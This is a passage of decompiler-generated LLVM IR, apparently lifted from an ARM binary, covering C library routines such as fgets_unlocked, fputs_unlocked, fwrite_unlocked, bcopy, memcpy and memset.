  br i1 %v0_115a4.pr.pr.pr, label %.thread20, label %.thread21

.thread21:                                        ; preds = %.thread16, %.thread18
  br label %bb43

bb42:                                             ; preds = %dec_label_pc_11580
  br label %bb43

.thread20:                                        ; preds = %.thread18
  br label %bb43

bb43:                                             ; preds = %bb41, %bb42, %.thread21, %dec_label_pc_11568, %.thread20
  %v0_115ac = phi i32 [ -1, %.thread21 ], [ 0, %bb41 ], [ %v0_115ac.pre, %dec_label_pc_11568 ], [ -1, %bb42 ], [ 0, %.thread20 ]
  store i32 %v0_115ac, i32* %r0.global-to-local, align 4
  store i32 %v3_113f8, i32* @r4, align 4
  ret i32 %v0_115ac

; uselistorder directives
  uselistorder i32 %v0_115ac, { 1, 0 }
  uselistorder i32 %v3_1155c, { 1, 2, 0 }
  uselistorder i32 %v2_1140c, { 1, 0, 2, 3, 4, 5, 6 }
  uselistorder i32* %sl.global-to-local, { 1, 0, 2 }
  uselistorder i32* %r1.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 8, 7, 9 }
  uselistorder i32* %r0.global-to-local, { 0, 1, 3, 9, 2, 10, 4, 5, 6, 7, 8 }
  uselistorder i1* %cpsr_z.global-to-local, { 1, 2, 3, 4, 12, 5, 6, 7, 8, 9, 10, 11, 0, 13, 14 }
  uselistorder i32* bitcast (i32** @global_var_237cc.617 to i32*), { 3, 0, 4, 1, 2, 5 }
  uselistorder i32* @global_var_27b4c.597, { 1, 4, 2, 0, 5, 3, 6 }
  uselistorder label %bb43, { 4, 1, 2, 0, 3 }
  uselistorder label %.thread21, { 1, 0 }
  uselistorder label %.thread11, { 2, 0, 1 }
  uselistorder label %bb39, { 2, 1, 0 }
  uselistorder label %.thread7, { 2, 1, 0 }
  uselistorder label %dec_label_pc_114fc, { 1, 0 }
  uselistorder label %dec_label_pc_114b4, { 1, 0 }
  uselistorder label %dec_label_pc_11424, { 1, 0 }
}

define i32 @__GI_fgets_unlocked(i8* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %cpsr_c.global-to-local = alloca i1, align 1
  %cpsr_z.global-to-local = alloca i1, align 1
  %r2.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  %tmp = ptrtoint i8* %arg1 to i32
  store i32 %arg2, i32* %r6.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_115e0 = icmp eq i32 %arg2, 0
  store i1 %v2_115e0, i1* %cpsr_z.global-to-local, align 1
  store i32 %tmp, i32* %r7.global-to-local, align 4
  store i32 %arg3, i32* @r5, align 4
  %tmp14 = icmp slt i32 %arg2, 1
  br i1 %tmp14, label %dec_label_pc_11668, label %dec_label_pc_1164c.preheader

dec_label_pc_1164c.preheader:                     ; preds = %entry
  store i32 %tmp, i32* @r4, align 4
  %v1_1164c15 = add i32 %arg2, -1
  store i32 %v1_1164c15, i32* %r6.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v7_1164c21 = icmp eq i32 %arg2, 1
  store i1 %v7_1164c21, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_1164c21, label %dec_label_pc_11658, label %dec_label_pc_115f8

dec_label_pc_115f8:                               ; preds = %dec_label_pc_1164c.preheader, %dec_label_pc_1164c.backedge
  %v1_1165024.in = phi i32 [ %v0_11650.pre, %dec_label_pc_1164c.backedge ], [ %arg3, %dec_label_pc_1164c.preheader ]
  %v1_115f8 = add i32 %v1_1165024.in, 16
  %v2_115f8 = inttoptr i32 %v1_115f8 to i32*
  %v3_115f8 = load i32, i32* %v2_115f8, align 4
  store i32 %v3_115f8, i32* %r2.global-to-local, align 4
  %v1_115fc = add i32 %v1_1165024.in, 24
  %v2_115fc = inttoptr i32 %v1_115fc to i32*
  %v3_115fc = load i32, i32* %v2_115fc, align 4
  %v3_11600 = icmp uge i32 %v3_115f8, %v3_115fc
  store i1 %v3_11600, i1* %cpsr_c.global-to-local, align 1
  %v9_11600 = icmp eq i32 %v3_115f8, %v3_115fc
  store i1 %v9_11600, i1* %cpsr_z.global-to-local, align 1
  br i1 %v3_11600, label %dec_label_pc_11620, label %dec_label_pc_11608

dec_label_pc_11608:                               ; preds = %dec_label_pc_115f8
  %v1_11608 = inttoptr i32 %v3_115f8 to i8*
  %v2_11608 = load i8, i8* %v1_11608, align 1
  %v5_11608 = add i32 %v3_115f8, 1
  store i32 %v5_11608, i32* %r2.global-to-local, align 4
  %v2_1160c = load i32, i32* @r4, align 4
  %v3_1160c = inttoptr i32 %v2_1160c to i8*
  store i8 %v2_11608, i8* %v3_1160c, align 1
  %v0_11610 = load i32, i32* @r4, align 4
  %v1_11610 = inttoptr i32 %v0_11610 to i8*
  %v2_11610 = load i8, i8* %v1_11610, align 1
  %v5_11610 = add i32 %v0_11610, 1
  store i32 %v5_11610, i32* @r4, align 4
  %v2_11614 = icmp ugt i8 %v2_11610, 9
  store i1 %v2_11614, i1* %cpsr_c.global-to-local, align 1
  %v7_11614 = icmp eq i8 %v2_11610, 10
  store i1 %v7_11614, i1* %cpsr_z.global-to-local, align 1
  %v0_11618 = load i32, i32* %r2.global-to-local, align 4
  %v1_11618 = load i32, i32* @r5, align 4
  %v2_11618 = add i32 %v1_11618, 16
  %v3_11618 = inttoptr i32 %v2_11618 to i32*
  store i32 %v0_11618, i32* %v3_11618, align 4
  br i1 %v7_11614, label %dec_label_pc_11658, label %dec_label_pc_1164c.backedge

dec_label_pc_11620:                               ; preds = %dec_label_pc_115f8
  %v1_1165024 = inttoptr i32 %v1_1165024.in to i8*
  %v3_11620 = call i32 @getc_unlocked(i8* %v1_1165024)
  %v4_11620 = trunc i32 %v3_11620 to i8
  %v5_11624 = icmp eq i8 %v4_11620, -1
  store i1 %v5_11624, i1* %cpsr_c.global-to-local, align 1
  %v10_11624 = icmp eq i32 %v3_11620, -1
  store i1 %v10_11624, i1* %cpsr_z.global-to-local, align 1
  br i1 %v5_11624, label %dec_label_pc_1162c, label %dec_label_pc_11648

dec_label_pc_1162c:                               ; preds = %dec_label_pc_11620
  %v0_1162c = load i32, i32* @r5, align 4
  %v1_1162c = inttoptr i32 %v0_1162c to i8*
  %v2_1162c = load i8, i8* %v1_1162c, align 1
  %v1_11630 = and i8 %v2_1162c, 8
  %v2_11630 = icmp eq i8 %v1_11630, 0
  store i1 %v2_11630, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_11630, label %dec_label_pc_11658, label %dec_label_pc_11668

dec_label_pc_11648:                               ; preds = %dec_label_pc_11620
  %v3_1163c = load i32, i32* @r4, align 4
  %v4_1163c = inttoptr i32 %v3_1163c to i8*
  store i8 %v4_11620, i8* %v4_1163c, align 1
  %v0_11640 = load i32, i32* @r4, align 4
  %v1_11640 = inttoptr i32 %v0_11640 to i8*
  %v2_11640 = load i8, i8* %v1_11640, align 1
  %v5_11640 = add i32 %v0_11640, 1
  store i32 %v5_11640, i32* @r4, align 4
  %v2_11644 = icmp ugt i8 %v2_11640, 9
  store i1 %v2_11644, i1* %cpsr_c.global-to-local, align 1
  %v7_11644 = icmp eq i8 %v2_11640, 10
  store i1 %v7_11644, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_11644, label %dec_label_pc_11658, label %dec_label_pc_1164c.backedge

dec_label_pc_1164c.backedge:                      ; preds = %dec_label_pc_11648, %dec_label_pc_11608
  %v0_1164c.pre = load i32, i32* %r6.global-to-local, align 4
  %v0_11650.pre = load i32, i32* @r5, align 4
  %v1_1164c = add i32 %v0_1164c.pre, -1
  store i32 %v1_1164c, i32* %r6.global-to-local, align 4
  %v2_1164c = icmp ne i32 %v0_1164c.pre, 0
  store i1 %v2_1164c, i1* %cpsr_c.global-to-local, align 1
  %v7_1164c = icmp eq i32 %v0_1164c.pre, 1
  store i1 %v7_1164c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_1164c, label %dec_label_pc_11658, label %dec_label_pc_115f8

dec_label_pc_11658:                               ; preds = %dec_label_pc_1164c.preheader, %dec_label_pc_11648, %dec_label_pc_1164c.backedge, %dec_label_pc_11608, %dec_label_pc_1162c
  %v0_11658 = load i32, i32* @r4, align 4
  %v1_11658 = load i32, i32* %r7.global-to-local, align 4
  %v3_11658 = icmp uge i32 %v0_11658, %v1_11658
  store i1 %v3_11658, i1* %cpsr_c.global-to-local, align 1
  %v9_11658 = icmp eq i32 %v0_11658, %v1_11658
  store i1 %v9_11658, i1* %cpsr_z.global-to-local, align 1
  %v2_1165c = xor i1 %v9_11658, true
  %v3_1165c = and i1 %v3_11658, %v2_1165c
  br i1 %v3_1165c, label %bb, label %.thread7

bb:                                               ; preds = %dec_label_pc_11658
  %v7_11660 = inttoptr i32 %v0_11658 to i8*
  store i8 0, i8* %v7_11660, align 1
  %v0_11664.pre = load i1, i1* %cpsr_c.global-to-local, align 1
  %v1_11664.pre = load i1, i1* %cpsr_z.global-to-local, align 1
  br label %.thread7

.thread7:                                         ; preds = %dec_label_pc_11658, %bb
  %v1_11664 = phi i1 [ %v1_11664.pre, %bb ], [ %v9_11658, %dec_label_pc_11658 ]
  %v0_11664 = phi i1 [ %v0_11664.pre, %bb ], [ %v3_11658, %dec_label_pc_11658 ]
  %v2_11664 = xor i1 %v1_11664, true
  %v3_11664 = and i1 %v0_11664, %v2_11664
  br i1 %v3_11664, label %.dec_label_pc_1166c_crit_edge, label %dec_label_pc_11668

.dec_label_pc_1166c_crit_edge:                    ; preds = %.thread7
  %v0_1166c.pre = load i32, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_1166c

dec_label_pc_11668:                               ; preds = %entry, %dec_label_pc_1162c, %.thread7
  store i32 0, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_1166c

dec_label_pc_1166c:                               ; preds = %.dec_label_pc_1166c_crit_edge, %dec_label_pc_11668
  %v0_1166c = phi i32 [ %v0_1166c.pre, %.dec_label_pc_1166c_crit_edge ], [ 0, %dec_label_pc_11668 ]
  ret i32 %v0_1166c

; uselistorder directives
  uselistorder i1 %v9_11658, { 1, 0, 2 }
  uselistorder i32 %v1_11658, { 1, 0 }
  uselistorder i32 %v0_11658, { 0, 2, 1 }
  uselistorder i32 %v0_1164c.pre, { 2, 0, 1 }
  uselistorder i1 %v2_11630, { 1, 0 }
  uselistorder i32 %v3_115f8, { 1, 0, 2, 3, 4 }
  uselistorder i32 %v1_1165024.in, { 2, 1, 0 }
  uselistorder i32* %r6.global-to-local, { 0, 2, 3, 1 }
  uselistorder i32* %r2.global-to-local, { 1, 2, 3, 0 }
  uselistorder i1* %cpsr_z.global-to-local, { 0, 1, 7, 2, 3, 4, 5, 6, 9, 8 }
  uselistorder i1* %cpsr_c.global-to-local, { 0, 1, 6, 2, 3, 4, 5, 8, 7 }
  uselistorder i8 -1, { 1, 2, 3, 4, 5, 0, 6 }
  uselistorder i8 9, { 1, 2, 3, 0, 4 }
  uselistorder label %dec_label_pc_1166c, { 1, 0 }
  uselistorder label %dec_label_pc_11668, { 2, 1, 0 }
  uselistorder label %.thread7, { 1, 0 }
  uselistorder label %dec_label_pc_11658, { 2, 1, 4, 3, 0 }
  uselistorder label %dec_label_pc_115f8, { 1, 0 }
}

define i32 @__GI_fputs_unlocked(i8* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %tmp = ptrtoint i8* %arg1 to i32
  %stack_var_-16 = alloca i32, align 4
  %v3_11674 = load i32, i32* @r4, align 4
  store i32 %v3_11674, i32* %stack_var_-16, align 4
  %v6_11674 = load i32, i32* @r5, align 4
  %v9_11674 = load i32, i32* @r6, align 4
  store i32 %arg2, i32* @r5, align 4
  store i32 %tmp, i32* @r4, align 4
  %v3_11680 = call i32 @strlen(i8* %arg1)
  store i32 %v3_11680, i32* @r6, align 4
  %v0_11688 = load i32, i32* @r5, align 4
  %v0_1168c = load i32, i32* @r4, align 4
  %v5_11698 = inttoptr i32 %v0_11688 to i8*
  %v6_11698 = call i32 @__GI_fwrite_unlocked(i32 %v0_1168c, i32 1, i32 %v3_11680, i8* %v5_11698)
  %v1_1169c = load i32, i32* @r6, align 4
  %v9_1169c = icmp eq i32 %v6_11698, %v1_1169c
  br i1 %v9_1169c, label %bb7, label %bb

bb:                                               ; preds = %entry
  br label %bb7

bb7:                                              ; preds = %entry, %bb
  %v14_116a4 = phi i32 [ %v6_11698, %entry ], [ -1, %bb ]
  %v2_116a4 = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_116a4, i32* @r4, align 4
  store i32 %v6_11674, i32* @r5, align 4
  store i32 %v9_11674, i32* @r6, align 4
  ret i32 %v14_116a4

; uselistorder directives
  uselistorder label %bb7, { 1, 0 }
}

define i32 @__GI_fwrite_unlocked(i32 %arg1, i32 %arg2, i32 %arg3, i8* %arg4) local_unnamed_addr {
entry:
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i8* %arg4 to i32
  store i32 %tmp, i32* %r3.global-to-local, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  %v9_116a8 = load i32, i32* @r6, align 4
  %v12_116a8 = load i32, i32* @r7, align 4
  store i32 %tmp, i32* @r4, align 4
  %v3_116b0 = load i8, i8* %arg4, align 1
  %v4_116b0 = zext i8 %v3_116b0 to i32
  %v1_116b4 = and i32 %v4_116b0, 192
  store i32 %v1_116b4, i32* %r3.global-to-local, align 4
  %v2_116b8 = icmp eq i32 %v1_116b4, 192
  store i32 %arg2, i32* @r5, align 4
  store i32 %arg1, i32* @r7, align 4
  store i32 %arg3, i32* @r6, align 4
  br i1 %v2_116b8, label %dec_label_pc_116e0, label %dec_label_pc_116d4

dec_label_pc_116d4:                               ; preds = %entry
  %v4_116d4 = call i32 @__stdio_trans2w_o(i8* nonnull %arg4, i32 128)
  %v2_116d8 = icmp eq i32 %v4_116d4, 0
  br i1 %v2_116d8, label %dec_label_pc_116d4.dec_label_pc_116e0_crit_edge, label %dec_label_pc_11748

dec_label_pc_116d4.dec_label_pc_116e0_crit_edge:  ; preds = %dec_label_pc_116d4
  %v0_116e0.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_116e0

dec_label_pc_116e0:                               ; preds = %dec_label_pc_116d4.dec_label_pc_116e0_crit_edge, %entry
  %v0_116e81 = phi i32 [ %v0_116e0.pre, %dec_label_pc_116d4.dec_label_pc_116e0_crit_edge ], [ %arg2, %entry ]
  %v2_116e0 = icmp eq i32 %v0_116e81, 0
  br i1 %v2_116e0, label %.thread, label %bb

.thread:                                          ; preds = %dec_label_pc_116e0
  br label %dec_label_pc_11748

bb:                                               ; preds = %dec_label_pc_116e0
  %v1_116e4 = load i32, i32* @r6, align 4
  %v3_116e4 = icmp eq i32 %v1_116e4, 0
  br i1 %v3_116e4, label %dec_label_pc_11748, label %dec_label_pc_116f4

dec_label_pc_116f4:                               ; preds = %bb
  %v2_116f4 = udiv i32 -1, %v0_116e81
  %v0_116fc = load i32, i32* @r4, align 4
  store i32 %v0_116fc, i32* %r2.global-to-local, align 4
  %tmp10 = icmp ugt i32 %v1_116e4, %v2_116f4
  br i1 %tmp10, label %dec_label_pc_11720, label %dec_label_pc_11708

dec_label_pc_11708:                               ; preds = %dec_label_pc_116f4
  %v0_11700 = load i32, i32* @r7, align 4
  %v2_11708 = mul i32 %v1_116e4, %v0_116e81
  %v4_1170c = call i32 @__stdio_fwrite(i32 %v0_11700, i32 %v2_11708, i32 %v0_116fc)
  %v0_11710 = load i32, i32* @r5, align 4
  %v2_11714 = udiv i32 %v4_1170c, %v0_11710
  store i32 %v2_11714, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_1174c

dec_label_pc_11720:                               ; preds = %dec_label_pc_116f4
  %v1_11720 = inttoptr i32 %v0_116fc to i32*
  %v2_11720 = load i32, i32* %v1_11720, align 4
  %v1_11724 = or i32 %v2_11720, 8
  store i32 %v1_11724, i32* %r3.global-to-local, align 4
  %v3_11728 = sdiv i32 %v2_11720, 256
  store i32 %v3_11728, i32* %r2.global-to-local, align 4
  %v1_1172c = trunc i32 %v3_11728 to i8
  %v3_1172c = add i32 %v0_116fc, 1
  %v4_1172c = inttoptr i32 %v3_1172c to i8*
  store i8 %v1_1172c, i8* %v4_1172c, align 1
  %v0_11730 = load i32, i32* %r3.global-to-local, align 4
  %v1_11730 = trunc i32 %v0_11730 to i8
  %v2_11730 = load i32, i32* @r4, align 4
  %v3_11730 = inttoptr i32 %v2_11730 to i8*
  store i8 %v1_11730, i8* %v3_11730, align 1
  %v0_11734 = call i32 @__errno_location()
  store i32 22, i32* %r3.global-to-local, align 4
  store i32 0, i32* %r2.global-to-local, align 4
  %v2_11740 = inttoptr i32 %v0_11734 to i32*
  store i32 22, i32* %v2_11740, align 4
  %v0_1174c.pre = load i32, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_1174c

dec_label_pc_11748:                               ; preds = %.thread, %dec_label_pc_116d4, %bb
  store i32 0, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_1174c

dec_label_pc_1174c:                               ; preds = %dec_label_pc_11720, %dec_label_pc_11708, %dec_label_pc_11748
  %v0_1174c = phi i32 [ %v0_1174c.pre, %dec_label_pc_11720 ], [ %v2_11714, %dec_label_pc_11708 ], [ 0, %dec_label_pc_11748 ]
  store i32 %v9_116a8, i32* @r6, align 4
  store i32 %v12_116a8, i32* @r7, align 4
  ret i32 %v0_1174c

; uselistorder directives
  uselistorder i32 %v3_11728, { 1, 0 }
  uselistorder i32 %v1_116e4, { 1, 0, 2 }
  uselistorder i32* %r3.global-to-local, { 1, 2, 3, 4, 0 }
  uselistorder i32* %r2.global-to-local, { 1, 2, 3, 4, 5, 6, 0 }
  uselistorder i32 (i32, i32, i32)* @__stdio_fwrite, { 3, 2, 0, 1 }
  uselistorder label %dec_label_pc_1174c, { 2, 0, 1 }
  uselistorder label %dec_label_pc_11748, { 2, 0, 1 }
}

define i32 @bcopy(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %v2_1176c = inttoptr i32 %arg2 to i8*
  %v3_1176c = call i32 @_memcpy(i8* %v2_1176c, i32 %arg1)
  ret i32 %v3_1176c
}

define i32 @memcpy() local_unnamed_addr {
entry:
  %v0_11770 = load i32, i32* @r0, align 4
  %v1_11770 = load i32, i32* @r1, align 4
  %v2_11770 = inttoptr i32 %v0_11770 to i8*
  %v3_11770 = call i32 @_memcpy(i8* %v2_11770, i32 %v1_11770)
  ret i32 %v3_11770
}

define i32 @__GI_memset(i8* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %cpsr_z.global-to-local = alloca i1, align 1
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  %tmp = ptrtoint i8* %arg1 to i32
  store i32 %tmp, i32* %r3.global-to-local, align 4
  %v0_11784 = load i32, i32* @r2, align 4
  %v8_11784 = icmp eq i32 %v0_11784, 8
  store i1 %v8_11784, i1* %cpsr_z.global-to-local, align 1
  %v5_11788 = icmp slt i32 %v0_11784, 8
  br i1 %v5_11788, label %dec_label_pc_117e8, label %dec_label_pc_1178c

dec_label_pc_1178c:                               ; preds = %entry
  %v4_1178c = mul i32 %arg2, 256
  %v5_1178c = or i32 %v4_1178c, %arg2
  %v4_11790 = mul i32 %v5_1178c, 65536
  %v5_11790 = or i32 %v4_11790, %v5_1178c
  store i32 %v5_11790, i32* %r1.global-to-local, align 4
  %v1_1179457 = urem i32 %tmp, 4
  %v2_1179458 = icmp eq i32 %v1_1179457, 0
  store i1 %v2_1179458, i1* %cpsr_z.global-to-local, align 1
  %extract.t83 = trunc i32 %arg2 to i8
  br i1 %v2_1179458, label %dec_label_pc_117a4, label %bb

bb:                                               ; preds = %dec_label_pc_1178c, %.thread.bb_crit_edge
  %arg2.sink.off0 = phi i8 [ %extract.t82, %.thread.bb_crit_edge ], [ %extract.t83, %dec_label_pc_1178c ]
  %v3_1179859 = phi i32 [ %v6_11798, %.thread.bb_crit_edge ], [ %tmp, %dec_label_pc_1178c ]
  %v4_11798 = inttoptr i32 %v3_1179859 to i8*
  store i8 %arg2.sink.off0, i8* %v4_11798, align 1
  %v5_11798 = load i32, i32* %r3.global-to-local, align 4
  %v6_11798 = add i32 %v5_11798, 1
  store i32 %v6_11798, i32* %r3.global-to-local, align 4
  %v0_1179c.pr = load i1, i1* %cpsr_z.global-to-local, align 1
  %v0_117a8.pr.pre = load i32, i32* @r2, align 4
  br i1 %v0_1179c.pr, label %dec_label_pc_117a4, label %.thread

.thread:                                          ; preds = %bb
  %v2_1179c = add i32 %v0_117a8.pr.pre, -1
  store i32 %v2_1179c, i32* @r2, align 4
  %v1_11794 = urem i32 %v6_11798, 4
  %v2_11794 = icmp eq i32 %v1_11794, 0
  store i1 %v2_11794, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_11794, label %dec_label_pc_117a4, label %.thread.bb_crit_edge

.thread.bb_crit_edge:                             ; preds = %.thread
  %v1_11798.pre = load i32, i32* %r1.global-to-local, align 4
  %extract.t82 = trunc i32 %v1_11798.pre to i8
  br label %bb

dec_label_pc_117a4:                               ; preds = %.thread, %bb, %dec_label_pc_1178c
  %v0_117b028 = phi i32 [ %tmp, %dec_label_pc_1178c ], [ %v6_11798, %bb ], [ %v6_11798, %.thread ]
  %v0_117a8.pr = phi i32 [ %v0_11784, %dec_label_pc_1178c ], [ %v0_117a8.pr.pre, %bb ], [ %v2_1179c, %.thread ]
  %v0_117a4 = load i32, i32* %r1.global-to-local, align 4
  store i32 %v0_117a4, i32* @ip, align 4
  %v8_117a810 = icmp eq i32 %v0_117a8.pr, 8
  store i1 %v8_117a810, i1* %cpsr_z.global-to-local, align 1
  %v5_117ac11 = icmp slt i32 %v0_117a8.pr, 8
  br i1 %v5_117ac11, label %dec_label_pc_117e8, label %dec_label_pc_117b0.preheader

dec_label_pc_117b0.preheader:                     ; preds = %dec_label_pc_117a4
  %v1_117b046 = inttoptr i32 %v0_117b028 to i32*
  store i32 %v0_117a4, i32* %v1_117b046, align 4
  %v3_117b047 = add i32 %v0_117b028, 4
  %v4_117b048 = inttoptr i32 %v3_117b047 to i32*
  %v5_117b049 = load i32, i32* @ip, align 4
  store i32 %v5_117b049, i32* %v4_117b048, align 4
  %v6_117b050 = add i32 %v0_117b028, 8
  store i32 %v6_117b050, i32* %r3.global-to-local, align 4
  %v0_117b451 = load i32, i32* @r2, align 4
  %v1_117b452 = add i32 %v0_117b451, -8
  store i32 %v1_117b452, i32* %r2.global-to-local, align 4
  %v5_117bc53 = icmp slt i32 %v1_117b452, 8
  br i1 %v5_117bc53, label %dec_label_pc_117b0.dec_label_pc_117e8.loopexit_crit_edge, label %dec_label_pc_117c0

dec_label_pc_117c0:                               ; preds = %dec_label_pc_117b0.preheader, %dec_label_pc_117a8.dec_label_pc_117b0_crit_edge
  %v6_117b055 = phi i32 [ %v6_117b0, %dec_label_pc_117a8.dec_label_pc_117b0_crit_edge ], [ %v6_117b050, %dec_label_pc_117b0.preheader ]
  %v0_117b054 = phi i32 [ %v12_117dc, %dec_label_pc_117a8.dec_label_pc_117b0_crit_edge ], [ %v0_117b028, %dec_label_pc_117b0.preheader ]
  %v1_117c0 = inttoptr i32 %v6_117b055 to i32*
  %v2_117c0 = load i32, i32* %r1.global-to-local, align 4
  store i32 %v2_117c0, i32* %v1_117c0, align 4
  %v3_117c0 = add i32 %v0_117b054, 12
  %v4_117c0 = inttoptr i32 %v3_117c0 to i32*
  %v5_117c0 = load i32, i32* @ip, align 4
  store i32 %v5_117c0, i32* %v4_117c0, align 4
  %v6_117c0 = add i32 %v0_117b054, 16
  store i32 %v6_117c0, i32* %r3.global-to-local, align 4
  %v0_117c4 = load i32, i32* %r2.global-to-local, align 4
  %v1_117c4 = add i32 %v0_117c4, -8
  store i32 %v1_117c4, i32* %r2.global-to-local, align 4
  %v5_117cc = icmp slt i32 %v1_117c4, 8
  br i1 %v5_117cc, label %dec_label_pc_117c0.dec_label_pc_117e8.loopexit_crit_edge, label %dec_label_pc_117d0

dec_label_pc_117d0:                               ; preds = %dec_label_pc_117c0
  %v1_117d0 = inttoptr i32 %v6_117c0 to i32*
  %v2_117d0 = load i32, i32* %r1.global-to-local, align 4
  store i32 %v2_117d0, i32* %v1_117d0, align 4
  %v3_117d0 = add i32 %v0_117b054, 20
  %v4_117d0 = inttoptr i32 %v3_117d0 to i32*
  %v5_117d0 = load i32, i32* @ip, align 4
  store i32 %v5_117d0, i32* %v4_117d0, align 4
  %v6_117d0 = add i32 %v0_117b054, 24
  store i32 %v6_117d0, i32* %r3.global-to-local, align 4
  %v0_117d4 = load i32, i32* %r2.global-to-local, align 4
  %v1_117d4 = add i32 %v0_117d4, -8
  store i32 %v1_117d4, i32* %r2.global-to-local, align 4
  %v5_117dc = icmp slt i32 %v1_117d4, 8
  br i1 %v5_117dc, label %dec_label_pc_117d0.dec_label_pc_117e8.loopexit_crit_edge, label %dec_label_pc_117a8

dec_label_pc_117a8:                               ; preds = %dec_label_pc_117d0
  %v7_117dc = inttoptr i32 %v6_117d0 to i32*
  %v8_117dc = load i32, i32* %r1.global-to-local, align 4
  store i32 %v8_117dc, i32* %v7_117dc, align 4
  %v9_117dc = add i32 %v0_117b054, 28
  %v10_117dc = inttoptr i32 %v9_117dc to i32*
  %v11_117dc = load i32, i32* @ip, align 4
  store i32 %v11_117dc, i32* %v10_117dc, align 4
  %v12_117dc = add i32 %v0_117b054, 32
  store i32 %v12_117dc, i32* %r3.global-to-local, align 4
  %v6_117e0 = load i32, i32* %r2.global-to-local, align 4
  %v7_117e0 = add i32 %v6_117e0, -8
  store i32 %v7_117e0, i32* %r2.global-to-local, align 4
  %v5_117ac = icmp slt i32 %v7_117e0, 8
  br i1 %v5_117ac, label %dec_label_pc_117a8.dec_label_pc_117e8.loopexit_crit_edge, label %dec_label_pc_117a8.dec_label_pc_117b0_crit_edge

dec_label_pc_117a8.dec_label_pc_117b0_crit_edge:  ; preds = %dec_label_pc_117a8
  %v2_117b0.pre = load i32, i32* %r1.global-to-local, align 4
  %v1_117b0 = inttoptr i32 %v12_117dc to i32*
  store i32 %v2_117b0.pre, i32* %v1_117b0, align 4
  %v3_117b0 = add i32 %v0_117b054, 36
  %v4_117b0 = inttoptr i32 %v3_117b0 to i32*
  %v5_117b0 = load i32, i32* @ip, align 4
  store i32 %v5_117b0, i32* %v4_117b0, align 4
  %v6_117b0 = add i32 %v0_117b054, 40
  store i32 %v6_117b0, i32* %r3.global-to-local, align 4
  %v0_117b4 = load i32, i32* %r2.global-to-local, align 4
  %v1_117b4 = add i32 %v0_117b4, -8
  store i32 %v1_117b4, i32* %r2.global-to-local, align 4
  %v5_117bc = icmp slt i32 %v1_117b4, 8
  br i1 %v5_117bc, label %dec_label_pc_117b0.dec_label_pc_117e8.loopexit_crit_edge, label %dec_label_pc_117c0

dec_label_pc_117b0.dec_label_pc_117e8.loopexit_crit_edge: ; preds = %dec_label_pc_117a8.dec_label_pc_117b0_crit_edge, %dec_label_pc_117b0.preheader
  %v1_117b4.lcssa = phi i32 [ %v1_117b452, %dec_label_pc_117b0.preheader ], [ %v1_117b4, %dec_label_pc_117a8.dec_label_pc_117b0_crit_edge ]
  store i1 false, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_117e8

dec_label_pc_117a8.dec_label_pc_117e8.loopexit_crit_edge: ; preds = %dec_label_pc_117a8
  store i1 false, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_117e8

dec_label_pc_117c0.dec_label_pc_117e8.loopexit_crit_edge: ; preds = %dec_label_pc_117c0
  store i1 false, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_117e8

dec_label_pc_117d0.dec_label_pc_117e8.loopexit_crit_edge: ; preds = %dec_label_pc_117d0
  store i1 false, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_117e8

dec_label_pc_117e8:                               ; preds = %dec_label_pc_117a4, %dec_label_pc_117b0.dec_label_pc_117e8.loopexit_crit_edge, %dec_label_pc_117a8.dec_label_pc_117e8.loopexit_crit_edge, %dec_label_pc_117c0.dec_label_pc_117e8.loopexit_crit_edge, %dec_label_pc_117d0.dec_label_pc_117e8.loopexit_crit_edge, %entry
  %v0_117f0 = phi i32 [ %v0_11784, %entry ], [ %v1_117d4, %dec_label_pc_117d0.dec_label_pc_117e8.loopexit_crit_edge ], [ %v1_117c4, %dec_label_pc_117c0.dec_label_pc_117e8.loopexit_crit_edge ], [ %v7_117e0, %dec_label_pc_117a8.dec_label_pc_117e8.loopexit_crit_edge ], [ %v1_117b4.lcssa, %dec_label_pc_117b0.dec_label_pc_117e8.loopexit_crit_edge ], [ %v0_117a8.pr, %dec_label_pc_117a4 ]
  %v2_117e8 = icmp eq i32 %v0_117f0, 0
  store i1 %v2_117e8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_117e8, label %bb32, label %bb33

bb32:                                             ; preds = %dec_label_pc_117e8
  ret i32 %tmp

bb33:                                             ; preds = %dec_label_pc_117e8
  %v1_117f0 = sub i32 7, %v0_117f0
  store i32 %v1_117f0, i32* %r2.global-to-local, align 4
  %v3_117f4 = mul i32 %v1_117f0, 4
  %v4_117f4 = add i32 %v3_117f4, ptrtoint (i32* @global_var_117fc.693 to i32)
  call void @__pseudo_branch(i32 %v4_117f4)
  %v0_117fc = load i32, i32* %r1.global-to-local, align 4
  %v1_117fc = trunc i32 %v0_117fc to i8
  %v2_117fc = load i32, i32* %r3.global-to-local, align 4
  %v3_117fc = inttoptr i32 %v2_117fc to i8*
  store i8 %v1_117fc, i8* %v3_117fc, align 1
